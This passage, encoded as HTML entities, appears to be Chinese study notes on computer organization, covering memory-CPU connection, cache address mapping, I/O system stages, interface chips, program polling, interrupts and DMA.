&#x5B57;&#x957F;</p><p>&#x5B58;&#x50A8;&#x5668;&#x4E0E;CPU&#x8FDE;&#x63A5;</p><p>&#x5730;&#x5740;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;CPU&#x7684;&#x5730;&#x5740;&#x7EBF;&#x5F80;&#x5F80;&#x6BD4;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7684;&#x5730;&#x5740;&#x7EBF;&#x6570;&#x591A;&#xFF0C;&#x901A;&#x5E38;&#x603B;&#x662F;&#x5C06;CPU&#x5730;&#x5740;&#x7EBF;&#x7684;&#x4F4E;&#x4F4D;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x82AF;&#x7247;&#x7684;&#x5730;&#x5740;&#x7EBF;&#x76F8;&#x8FDE;&#xFF0C;CPU&#x5730;&#x5740;&#x7EBF;&#x7684;&#x9AD8;&#x4F4D;&#x6216;&#x5728;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7684;&#x6269;&#x5145;&#x65F6;&#x7528;&#xFF0C;&#x6216;&#x4F5C;&#x5176;&#x4ED6;&#x7528;&#x9014;&#x3002;</p><p>&#x6570;&#x636E;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;CPU&#x7684;&#x6570;&#x636E;&#x7EBF;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x4E5F;&#x4E0D;&#x7B49;&#xFF0C;&#x56E0;&#x6B64;&#x5FC5;&#x987B;&#x5BF9;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x6269;&#x4F4D;&#x4F7F;&#x5176;&#x76F8;&#x7B49;</p><p>&#x7247;&#x9009;&#x7EBF;&#x7684;&#x8FDE;&#x63A5;&#x2013;&#x662F;CPU&#x4E0E;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x6B63;&#x786E;&#x5DE5;&#x4F5C;&#x7684;&#x5173;&#x952E;</p><p>&#x5408;&#x7406;&#x9009;&#x62E9;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x2013;&#x6307;&#x5B58;&#x50A8;&#x82AF;&#x7247;&#x7C7B;&#x578B;(RAM&#x6216;ROM)&#x548C;&#x6570;&#x91CF;&#x7684;&#x9009;&#x62E9;&#x3002;&#x901A;&#x5E38;&#x7528;ROM&#x5B58;&#x653E;&#x7A0B;&#x5E8F;&#xFF0C;&#x6807;&#x51C6;&#x5B50;&#x7A0B;&#x5E8F;&#x548C;&#x5404;&#x7C7B;&#x5E38;&#x6570;&#x7B49;&#x3002;RAM&#x4E3A;&#x7528;&#x6237;&#x7F16;&#x7A0B;&#x8BBE;&#x8BA1;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5C3D;&#x91CF;&#x9009;&#x62E9;&#x8FDE;&#x7EBF;&#x7B80;&#x5355;&#x65B9;&#x4FBF;&#x3002;</p><p>&#x63D0;&#x9AD8;&#x8BBF;&#x5B58;&#x901F;&#x5EA6;&#x7684;&#x63AA;&#x65BD;</p><p>&#x5355;&#x4F53;&#x591A;&#x5B57;&#x7CFB;&#x7EDF;&#x2013;&#x5728;&#x4E00;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x5185;&#xFF0C;&#x4ECE;&#x540C;&#x4E00;&#x5730;&#x5740;&#x53D6;&#x51FA;4&#x6761;&#x6307;&#x4EE4;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x9010;&#x6761;&#x9001;&#x81F3;CPU&#x6267;&#x884C;&#x3002;&#x589E;&#x5927;&#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD;&#xFF0C;&#x63D0;&#x9AD8;&#x5B58;&#x50A8;&#x5668;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x3002;&#x524D;&#x63D0;&#x662F;&#xFF0C;&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x5728;&#x4E3B;&#x5B58;&#x5185;&#x5FC5;&#x987B;&#x662F;&#x8FDE;&#x7EED;&#x5B58;&#x653E;&#x3002;</p><p>&#x591A;&#x4F53;&#x5E76;&#x884C;&#x7CFB;&#x7EDF;&#x2013;&#x91C7;&#x7528;&#x591A;&#x63D0;&#x6A21;&#x5757;&#x7EC4;&#x6210;&#x7684;&#x5B58;&#x50A8;&#x5668;&#xFF0C;&#x6BCF;&#x4E2A;&#x6A21;&#x5757;&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x5BB9;&#x91CF;&#x548C;&#x5B58;&#x53D6;&#x901F;&#x5EA6;&#xFF0C;&#x5404;&#x81EA;&#x5177;&#x6709;&#x72EC;&#x7ACB;&#x7684;&#x5BC4;&#x5B58;&#x5668;(MAR)&#xFF0C;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;(MDR)&#xFF0C;&#x5730;&#x5740;&#x8BD1;&#x7801;&#xFF0C;&#x9A71;&#x52A8;&#x7535;&#x8DEF;&#x548C;&#x8BFB;&#x5199;&#x7535;&#x8DEF;&#x3002;</p><p>&#x9AD8;&#x4F4D;&#x4EA4;&#x53C9;&#x7F16;&#x5740;&#x7684;&#x591A;&#x4F53;&#x5B58;&#x50A8;&#x5668;</p><p>&#x4F4E;&#x4F4D;&#x4EA4;&#x53C9;&#x7F16;&#x5740;&#x7684;&#x591A;&#x4F53;&#x5B58;&#x50A8;&#x5668;</p><p>&#x9AD8;&#x901F;&#x7F13;&#x51B2;&#x5B58;&#x50A8;&#x5668;</p><p>Cache&#x7684;&#x57FA;&#x672C;&#x7ED3;&#x6784;</p><p>&#x5730;&#x5740;&#x6620;&#x5C04;&#x53D8;&#x6362;&#x673A;&#x6784;&#x2013;&#x5C06;CPU&#x9001;&#x6765;&#x7684;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x8F6C;&#x6362;&#x4E3A;Cache&#x5730;&#x5740;&#x3002;</p><p>Cache&#x2013;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x6620;&#x5C04;</p><p>&#x76F4;&#x63A5;&#x6620;&#x5C04;</p><p>&#x4F18;&#x70B9;&#xFF1A;&#x5B9E;&#x73B0;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E3B;&#x5B58;&#x5730;&#x5740;&#x7684;&#x67D0;&#x4E9B;&#x4F4D;&#x76F4;&#x63A5;&#x5224;&#x65AD;&#xFF0C;&#x5373;&#x53EF;&#x786E;&#x5B9A;&#x6240;&#x9700;&#x5B57;&#x5757;&#x662F;&#x5426;&#x5728;&#x7F13;&#x5B58;&#x4E2D;</p><p>&#x7F3A;&#x70B9;&#xFF1A;&#x4E0D;&#x591F;&#x7075;&#x6D3B;&#xFF0C;&#x6BCF;&#x4E2A;&#x4E3B;&#x5B58;&#x5FEB;&#x53EA;&#x80FD;&#x56FA;&#x5B9A;&#x7684;&#x5BF9;&#x5E94;&#x67D0;&#x4E2A;&#x7F13;&#x5B58;&#x5757;&#xFF0C;&#x5373;&#x4F7F;&#x7F13;&#x5B58;&#x5185;&#x8FD8;&#x7A7A;&#x7740;&#x8BB8;&#x591A;&#x4F4D;&#x7F6E;&#x4E5F;&#x4E0D;&#x80FD;&#x88AB;&#x5360;&#x7528;&#xFF0C;&#x4F7F;&#x7F13;&#x5B58;&#x7684;&#x7A7A;&#x95F4;&#x5F97;&#x4E0D;&#x5230;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x3002;&#x6B64;&#x5916;&#xFF0C;&#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x6070;&#x597D;&#x91CD;&#x590D;&#x8BBF;&#x95EE;&#x5BF9;&#x5E94;&#x540C;&#x4E00;&#x7F13;&#x5B58;&#x4F4D;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x4E3B;&#x5B58;&#x5757;&#xFF0C;&#x5C31;&#x8981;&#x4E0D;&#x505C;&#x7684;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#xFF0C;&#x964D;&#x4F4E;&#x547D;&#x4E2D;&#x7387;&#x3002;</p><p>&#x5168;&#x76F8;&#x8054;&#x6620;&#x5C04;&#x2013;&#x5141;&#x8BB8;&#x4E3B;&#x5B58;&#x4E2D;&#x6BCF;&#x4E00;&#x5B57;&#x5757;&#x6620;&#x5C04;&#x5230;Cache&#x4E2D;&#x7684;&#x4EFB;&#x4F55;&#x4E00;&#x5757;&#x4F4D;&#x7F6E;&#x4E0A;&#x3002;</p><p>&#x4F18;&#x70B9;&#xFF1A;&#x7075;&#x6D3B;&#xFF0C;&#x547D;&#x4E2D;&#x7387;&#x9AD8;&#xFF0C;&#x7F29;&#x5C0F;&#x4E86;&#x5FEB;&#x51B2;&#x7A81;&#x7387;&#x3002;</p><p>&#x7F3A;&#x70B9;&#xFF1A;&#x6240;&#x9700;&#x7684;&#x903B;&#x8F91;&#x7535;&#x8DEF;&#x751A;&#x591A;&#xFF0C;&#x6210;&#x672C;&#x8F83;&#x9AD8;&#x3002;</p><p>&#x7EC4;&#x76F8;&#x8054;&#x6620;&#x5C04;</p><p>&#x4E94;  &#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;</p><p>&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;&#x53D1;&#x5C55;&#x7684;&#x56DB;&#x4E2A;&#x9636;&#x6BB5;</p><ol><li>&#x65E9;&#x671F;&#x9636;&#x6BB5;</li></ol><p>&#x5206;&#x6563;&#x8FDE;&#x63A5; CPU&#x548C;I/O&#x8BBE;&#x5907; &#x4E32;&#x884C;&#x5DE5;&#x4F5C; &#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F;</p><ol start="2"><li>&#x63A5;&#x53E3;&#x6A21;&#x5757;&#x548C;DMA&#x9636;&#x6BB5;</li></ol><p>&#x603B;&#x7EBF;&#x8FDE;&#x63A5; CPU&#x548C;I/O&#x8BBE;&#x5907;&#x5E76;&#x884C;&#x5DE5;&#x4F5C;</p><ol start="3"><li><p>&#x5177;&#x6709;&#x901A;&#x9053;&#x7ED3;&#x6784;&#x7684;&#x9636;&#x6BB5;</p></li><li><p>&#x5177;&#x6709;I/O&#x5904;&#x7406;&#x673A;&#x7684;&#x9636;&#x6BB5;</p></li></ol><p>&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;&#x7684;&#x7EC4;&#x6210;</p><p>1.I/O&#x8F6F;&#x4EF6;</p><p>I/O&#x6307;&#x4EE4; CPU&#x6307;&#x4EE4;&#x7684;&#x4E00;&#x90E8;&#x5206;</p><p>| &#x64CD;&#x4F5C;&#x7801; | &#x547D;&#x4EE4;&#x7801; | &#x8BBE;&#x5907;&#x7801; |</p><p>&#x901A;&#x9053;&#x6307;&#x4EE4;&#xFF1A;&#x901A;&#x9053;&#x81EA;&#x8EAB;&#x7684;&#x6307;&#x4EE4; &#x6307;&#x660E;&#x6570;&#x7EC4;&#x7684;&#x9996;&#x5730;&#x5740;&#x3001;&#x4F20;&#x9001;&#x5B57;&#x6570;&#x3001;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x3002;</p><p>I/O&#x786C;&#x4EF6;</p><p>&#x8BBE;&#x5907; I/O&#x63A5;&#x53E3;</p><p>&#x8BBE;&#x5907; &#x8BBE;&#x5907;&#x63A7;&#x5236;&#x5668; &#x901A;&#x9053;</p><p>I/O&#x8BBE;&#x5907;&#x4E0E;&#x4E3B;&#x673A;&#x7684;&#x8054;&#x7CFB;&#x65B9;&#x5F0F;</p><ol><li>I/O&#x8BBE;&#x5907;&#x7F16;&#x5740;&#x65B9;&#x5F0F;</li></ol><p>&#x7EDF;&#x4E00;&#x7F16;&#x5740; &#x7528;&#x53D6;&#x6570;&#x5B58;&#x6570;&#x6307;&#x4EE4;</p><p>&#x4E0D;&#x7EDF;&#x4E00;&#x7F16;&#x5740; &#x6709;&#x4E13;&#x95E8;&#x7684;I/O&#x6307;&#x4EE4;</p><ol start="2"><li>&#x8BBE;&#x5907;&#x5BFB;&#x5740;</li></ol><p>&#x7528;&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7535;&#x8DEF;&#x8BC6;&#x522B;&#x662F;&#x5426;&#x88AB;&#x9009;&#x4E2D;</p><ol start="3"><li>&#x4F20;&#x9001;&#x65B9;&#x5F0F;</li></ol><p>&#x4E32;&#x884C; &#x5E76;&#x884C;</p><ol start="4"><li>&#x8054;&#x7EDC;&#x65B9;&#x5F0F;</li></ol><p>&#x7ACB;&#x5373;&#x54CD;&#x5E94;&#x65B9;&#x5F0F;</p><p>&#x5F02;&#x6B65;&#x65B9;&#x5F0F;&#x91C7;&#x7528;&#x5E94;&#x7B54;&#x4FE1;&#x53F7;</p><p>&#x540C;&#x6B65;&#x5DE5;&#x4F5C;&#x91C7;&#x7528;&#x540C;&#x6B65;&#x65F6;&#x6807;&#x8054;&#x7EDC;</p><ol start="5"><li>I/O&#x8BBE;&#x5907;</li></ol><p>&#x8F90;&#x5C04;&#x5F0F;&#x8FDE;&#x63A5;</p><p>&#x603B;&#x7EBF;&#x5F0F;&#x8FDE;&#x63A5;</p><p>I/O&#x8BBE;&#x5907;&#x4E0E;&#x4E3B;&#x673A;&#x4FE1;&#x606F;&#x4F20;&#x9001;&#x7684;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</p><ol><li>&#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F;</li></ol><ol start="2"><li>&#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;</li></ol><p>&#x5018;&#x82E5;CPU&#x5728;&#x542F;&#x52A8;I/O&#x8BBE;&#x5907;&#x540E;&#xFF0C;&#x4E0D;&#x67E5;&#x8BE2;&#x8BBE;&#x5907;&#x662F;&#x5426;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x81EA;&#x8EAB;&#x7A0B;&#x5E8F;&#xFF0C;&#x53EA;&#x662F;&#x5F53;I/O&#x8BBE;&#x5907;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x5E76;&#x5411;CPU&#x53D1;&#x51FA;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x540E;&#x624D;&#x4E88;&#x4EE5;&#x54CD;&#x5E94;&#x3002;</p><ol start="3"><li>DMA&#x65B9;&#x5F0F;(&#x76F4;&#x63A5;&#x5B58;&#x50A8;&#x5668;&#x5B58;&#x53D6;)</li></ol><p>&#x4E3B;&#x5B58;&#x4E0E;I/O&#x8BBE;&#x5907;&#x4E4B;&#x95F4;&#x6709;&#x4E00;&#x6761;&#x6570;&#x636E;&#x901A;&#x8DEF;&#xFF0C;&#x4E3B;&#x5B58;&#x4E0E;I/O&#x8BBE;&#x5907;&#x4EA4;&#x6362;&#x4FE1;&#x606F;&#x65F6;&#xFF0C;&#x65E0;&#x987B;&#x8C03;&#x7528;&#x4E2D;&#x65AD;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x82E5;&#x51FA;&#x73B0;DMA&#x548C;CPU&#x540C;&#x65F6;&#x8BBF;&#x95EE;&#x4E3B;&#x5B58;&#xFF0C;CPU&#x603B;&#x662F;&#x5C06;&#x603B;&#x7EBF;&#x5360;&#x6709;&#x6743;&#x8BA9;&#x7ED9;DMA&#xFF0C;&#x901A;&#x5E38;&#x628A;DMA&#x8FD9;&#x79CD;&#x5360;&#x6709;&#x79F0;&#x4E3A;&#x7A83;&#x53D6;&#x6216;&#x632A;&#x7528;&#x3002;&#x7A83;&#x53D6;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x822C;&#x4E3A;&#x4E00;&#x4E2A;&#x5468;&#x671F;&#xFF0C;&#x6545;&#x53C8;&#x628A;DMA&#x5360;&#x7528;&#x7684;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x7A83;&#x53D6;&#x5468;&#x671F;&#x6216;&#x632A;&#x7528;&#x5468;&#x671F;&#x3002;</p><p>I/O&#x63A5;&#x53E3;</p><p>&#x4E3A;&#x4EC0;&#x4E48;&#x8BBE;&#x7F6E;I/O&#x63A5;&#x53E3;</p><p>&#x5B9E;&#x73B0;&#x8BBE;&#x5907;&#x7684;&#x9009;&#x62E9;</p><p>&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x8FBE;&#x5230;&#x901F;&#x5EA6;&#x5339;&#x914D;</p><p>&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x4E32;&#x2013;&#x5E76;&#x683C;&#x5F0F;&#x8F6C;&#x6362;</p><p>&#x5B9E;&#x73B0;&#x7535;&#x5E73;&#x8F6C;&#x6362;</p><p>&#x5B9E;&#x73B0;&#x7535;&#x5E73;&#x8F6C;&#x6362;</p><p>&#x4F20;&#x9001;&#x63A7;&#x5236;&#x547D;&#x4EE4;</p><p>&#x53CD;&#x6620;&#x8BBE;&#x5907;&#x7684;&#x72B6;&#x6001;(&#x201C;&#x5FD9;&#x201D;,&#x201D;&#x5C31;&#x7EEA;&#x201D;,&#x201D;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x201D;)</p><p>&#x7AEF;&#x53E3;&#x548C;&#x63A5;&#x53E3;&#x7684;&#x5173;&#x7CFB;</p><p>&#x7AEF;&#x53E3;&#x662F;&#x6307;&#x63A5;&#x53E3;&#x7535;&#x8DEF;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x8FD9;&#x4E9B;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6570;&#x636E;&#x4FE1;&#x606F;&#xFF0C;&#x63A7;&#x5236;&#x4FE1;&#x606F;&#x548C;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#xFF0C;&#x76F8;&#x5E94;&#x7684;&#x7AEF;&#x53E3;&#x88AB;&#x5206;&#x522B;&#x79F0;&#x4E3A;&#x6570;&#x636E;&#x7AEF;&#x53E3;&#xFF0C;&#x63A7;&#x5236;&#x7AEF;&#x53E3;&#xFF0C;&#x548C;&#x72B6;&#x6001;&#x7AEF;&#x53E3;&#x3002;&#x82E5;&#x5E72;&#x4E2A;&#x7AEF;&#x53E3;&#x52A0;&#x4E0A;&#x76F8;&#x5E94;&#x7684;&#x63A7;&#x5236;&#x903B;&#x8F91;&#x624D;&#x80FD;&#x7EC4;&#x6210;&#x63A5;&#x53E3;&#x3002;</p><p>&#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210;</p><p>&#x603B;&#x7EBF;&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;&#x7684;I/O&#x63A5;&#x53E3;&#x7535;&#x8DEF;</p><p>&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7EBF;&#xFF0C;&#x6570;&#x636E;&#x7EBF;&#xFF0C;&#x547D;&#x4EE4;&#x7EBF;&#xFF0C;&#x72B6;&#x6001;&#x7EBF;</p><p>&#x63A5;&#x53E3;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7EC4;&#x6210;</p><table><thead><tr><th>&#x63A5;&#x53E3;&#x529F;&#x80FD;</th><th>&#x63A5;&#x53E3;&#x7EC4;&#x6210;</th></tr></thead><tbody><tr><td>&#x9009;&#x5740;&#x529F;&#x80FD;</td><td>&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x7535;&#x8DEF;</td></tr><tr><td>&#x4F20;&#x9001;&#x547D;&#x4EE4;&#x7684;&#x529F;&#x80FD;</td><td>&#x547D;&#x4EE4;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x547D;&#x4EE4;&#x8BD1;&#x7801;&#x5668;</td></tr><tr><td>&#x4F20;&#x9001;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;</td><td>&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5BC4;&#x5B58;&#x5668;</td></tr><tr><td>&#x53CD;&#x6620;&#x8BBE;&#x5907;&#x72B6;&#x6001;&#x7684;&#x529F;&#x80FD;</td><td>&#x8BBE;&#x5907;&#x6807;&#x8BB0;&#x72B6;&#x6001;</td></tr></tbody></table><p>&#x63A5;&#x53E3;&#x7C7B;&#x578B;</p><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x79CD;&#x7C7B;</th></tr></thead><tbody><tr><td>&#x6309;&#x6570;&#x636E;&#x4F20;&#x9001;&#x65B9;&#x5F0F;</td><td>&#x5E76;&#x884C;&#x63A5;&#x53E3;(Intel 8255) &#x4E32;&#x884C;&#x63A5;&#x53E3;(Intel 8251)</td></tr><tr><td>&#x6309;&#x529F;&#x80FD;&#x9009;&#x62E9;&#x7684;&#x7075;&#x6D3B;&#x6027;</td><td>&#x53EF;&#x7F16;&#x7A0B;&#x63A5;&#x53E3;(Intel 8255,Intel 8251) &#x4E0D;&#x53EF;&#x7F16;&#x7A0B;&#x63A5;&#x53E3;(Intel 8212)</td></tr><tr><td>&#x6309;&#x901A;&#x7528;&#x6027;</td><td>&#x901A;&#x7528;&#x63A5;&#x53E3;(Intel 8255&#x3001; Intel 8251) &#x4E13;&#x7528;&#x63A5;&#x53E3;(Intel 8279&#x3001; Intel 8275)</td></tr><tr><td>&#x6309;&#x6570;&#x636E;&#x4F20;&#x9001;&#x7684;&#x63A7;&#x5236;&#x65B9;&#x5F0F;</td><td>&#x4E2D;&#x65AD;&#x63A5;&#x53E3;(Intel 8259) DMA&#x63A5;&#x53E3;(Intel 8257)</td></tr></tbody></table><p>&#x7A0B;&#x5E8F;&#x67E5;&#x8BE2;&#x65B9;&#x5F0F;</p><table><thead><tr><th>&#x6307;&#x4EE4;</th><th>&#x4F5C;&#x7528;</th></tr></thead><tbody><tr><td>&#x6D4B;&#x8BD5;&#x6307;&#x4EE4;</td><td>&#x7528;&#x6765;&#x67E5;&#x8BE2;I/O&#x8BBE;&#x5907;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA;</td></tr><tr><td>&#x4F20;&#x9001;&#x6307;&#x4EE4;</td><td>&#x5F53;I/O&#x8BBE;&#x5907;&#x5DF2;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x65F6;&#xFF0C;&#x6267;&#x884C;&#x4F20;&#x9001;&#x6307;&#x4EE4;</td></tr><tr><td>&#x8F6C;&#x79FB;&#x6307;&#x4EE4;</td><td>&#x82E5;I/O&#x8BBE;&#x5907;&#x672A;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#xFF0C;&#x6267;&#x884C;&#x8F6C;&#x79FB;&#x6307;&#x4EE4;&#xFF0C;&#x8F6C;&#x81F3;&#x6D4B;&#x8BD5;&#x6307;&#x4EE4;&#xFF0C;&#x7EE7;&#x7EED;&#x6D4B;&#x8BD5;I/O&#x8BBE;&#x5907;&#x7684;&#x72B6;&#x6001;</td></tr></tbody></table><p>&#x7A0B;&#x5E8F;&#x6D41;&#x7A0B;</p><p>1&#xFF09;CPU&#x53D1;I/O&#x5730;&#x5740;&#x8BBE;&#x5907;&#x5F00;&#x59CB;&#x5DE5;&#x4F5C;&#xFF1B;&#x5730;&#x5740;&#x603B;&#x7EBF;&#xF0AE;&#x63A5;&#x53E3;&#xF0AE;&#x8BBE;&#x5907;&#x9009;&#x62E9;&#x5668;&#x8BD1;&#x7801;&#xF0AE;&#x9009;&#x4E2D;&#xF0AE;&#x53D1;SEL&#x4FE1;&#x53F7;&#xFF1B;2&#xFF09;CPU&#x53D1;&#x542F;&#x52A8;&#x547D;&#x4EE4;DBR&#xF0AE;&#x5F00;&#x547D;&#x4EE4;&#x63A5;&#x6536;&#x95E8;&#xFF1B;&#xF0AE;D&#x7F6E;0&#xFF0C;B&#x7F6E;1&#xF0AE;&#x63A5;&#x53E3;&#x5411;&#x8BBE;&#x5907;&#x53D1;&#x542F;&#x52A8;&#x547D;&#x4EE4;&#xFF1B;3&#xFF09;CPU&#x7B49;&#x5F85;&#xFF0C;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x8BFB;&#x51FA;&#x6570;&#x636E;&#xFF1B;4&#xFF09;&#x5916;&#x8BBE;&#x5DE5;&#x4F5C;&#x5B8C;&#x6210;&#xFF0C;B&#x7F6E;0&#xFF0C;D&#x7F6E;1&#xFF1B;5&#xFF09;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x4FE1;&#x53F7;&#xF0AE;&#x63A5;&#x53E3;&#xF0AE;&#x5B8C;&#x6210;&#x4FE1;&#x53F7;&#xF0AE;&#x63A7;&#x5236;&#x603B;&#x7EBF;&#xF0AE;CPU&#xFF1B;6&#xFF09;&#x8F93;&#x5165;&#xFF1A;CPU&#x901A;&#x8FC7;&#x8F93;&#x5165;&#x6307;&#x4EE4;&#xFF08;IN&#xFF09;&#x5C06;DBR&#x4E2D;&#x7684;&#x6570;&#x636E;&#x53D6;&#x8D70;&#x3002;</p><p>&#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;</p><p>&#x4E2D;&#x65AD;:&#x5728;&#x6267;&#x884C;&#x7A0B;&#x5E8F;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5F53;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x6216;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x8BA1;&#x7B97;&#x673A;&#x505C;&#x6B62;&#x73B0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;&#xFF0C;&#x8F6C;&#x5411;&#x5BF9;&#x8FD9;&#x4E9B;&#x5F02;&#x5E38;&#x60C5;&#x51B5;&#x6216;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x7684;&#x8BF7;&#x6C42;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5904;&#x7406;&#x7ED3;&#x675F;&#x540E;&#x518D;&#x8FD4;&#x56DE;&#x5230;&#x73B0;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x95F4;&#x65AD;&#x5904;&#xFF0C;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x6E90;&#x7A0B;&#x5E8F;&#x3002;</p><p>&#x7A0B;&#x5E8F;&#x4E2D;&#x65AD;&#x65B9;&#x5F0F;&#x914D;&#x7F6E;&#x4E2D;&#x65AD;&#x8BF7;&#x6C42;&#x548C;&#x4E2D;&#x65AD;&#x5BC4;&#x5B58;</p><p>&#x63A5;&#x53E3;&#x7535;&#x8DEF;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><p>&#x4E2D;&#x65AD;&#x5904;&#x7406;&#x8FC7;&#x7A0B;</p><ol><li>CPU&#x54CD;&#x5E94;&#x4E2D;&#x65AD;&#x7684;&#x6761;&#x4EF6;&#x548C;&#x65F6;&#x95F4;</li></ol><p>(1)&#x6761;&#x4EF6;</p><p>&#x5141;&#x8BB8;&#x4E2D;&#x65AD;&#x89E6;&#x53D1;&#x5668; EINT = 1</p><p>&#x7528; &#x5F00;&#x4E2D;&#x65AD; &#x6307;&#x4EE4;&#x5C06; EINT &#x7F6E; &#x201C;1&#x201D;</p><p>&#x7528; &#x5173;&#x4E2D;&#x65AD; &#x6307;&#x4EE4;&#x5C06; EINT &#x7F6E;&#x201C; 0&#x201D; &#x6216;&#x786C;&#x4EF6; &#x81EA;&#x52A8;&#x590D;&#x4F4D;</p><p>(2)&#x65F6;&#x95F4;</p><p>&#x5F53; D = 1&#xFF08;&#x968F;&#x673A;&#xFF09;&#x4E14; MASK = 0 &#x65F6;</p><p>&#x5728;&#x6BCF;&#x6761;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x9636;&#x6BB5;&#x7684;&#x7ED3;&#x675F;&#x524D;</p><p>CPU &#x53D1; &#x4E2D;&#x65AD;&#x67E5;&#x8BE2;&#x4FE1;&#x53F7;&#xFF08;&#x5C06; INTR &#x7F6E;&#x201C;1&#x201D;&#xFF09;</p><ol start="2"><li>I/O&#x4E2D;&#x65AD;&#x5904;&#x7406;&#x8FC7;&#x7A0B;</li></ol><p>1.CPU&#x53D1;&#x542F;&#x52A8;I/O&#x8BBE;&#x5907;&#x547D;&#x4EE4;&#xFF0C;&#x5C06;&#x63A5;&#x53E3;&#x4E2D;&#x7684;B&#x7F6E;1&#xFF0C;D&#x7F6E;0</p><p>2.&#x63A5;&#x53E3;&#x542F;&#x52A8;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5F00;&#x59CB;&#x5DE5;&#x4F5C;</p><p>3.&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5C06;&#x6570;&#x636E;&#x9001;&#x5165;&#x6570;&#x636E;&#x7F13;&#x51B2;&#x5BC4;&#x5B58;&#x5668;</p><p>4.&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x5411;&#x63A5;&#x53E3;&#x53D1;&#x51FA;&#x201D;&#x8BBE;&#x5907;&#x5DE5;&#x4F5C;&#x7ED3;&#x675F;&#x201D;&#x4FE1;&#x53F7;&#xFF0C;&#x5C06;D&#x7F6E;1&#xFF0C;B&#x7F6E;0</p><p>5.&#x5F53;&#x8BBE;&#x5907;&#x51C6;&#x5907;&#x5C31;&#x7EEA;(D=1)&#xFF0C;&#x4E14;&#x672C;&#x8BBE;&#x5907;&#x672A;&#x88AB;&#x5C4F;&#x853D;(MASK=0)&#xFF0C;&#x5728;&#x6307;&#x4EE4;&#x6267;&#x884C;&#x9636;&#x6BB5;&#x7684;&#x7ED3;&#x675F;&#x65F6;&#x523B;&#xFF0C;&#x7531;CPU&#x53D1;&#x51FA;&#x4E2D;&#x65AD;&#x67E5;&#x8BE2;&#x4FE1;&#x53F